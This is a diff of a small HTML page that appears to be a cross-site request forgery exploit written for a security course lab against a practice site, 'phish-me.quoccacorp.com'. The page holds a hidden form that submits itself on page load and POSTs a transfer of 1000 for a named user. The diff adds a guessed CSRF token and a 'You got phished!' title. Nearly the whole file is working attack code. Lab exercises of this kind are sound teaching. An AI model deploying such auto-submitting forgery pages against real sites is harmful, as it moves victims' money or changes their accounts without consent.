@@ -1,11 +1,17 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>You got phished!</title>
+</head>
 <body>
-    <form id="csrf-form" action="https://phish-me.quoccacorp.com/api/transfer" method="POST" enctype="text/plain">
+    <form id="csrf-form" action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
+        <input type="hidden" name="csrf_token" value="NTUwMg==">
         <input type="hidden" name="username" value="z5625996">
         <input type="hidden" name="amount" value="1000">
     </form>
+
     <script>
+        // 当页面加载时，自动提交上述表单
         document.getElementById('csrf-form').submit();
     </script>
 </body>
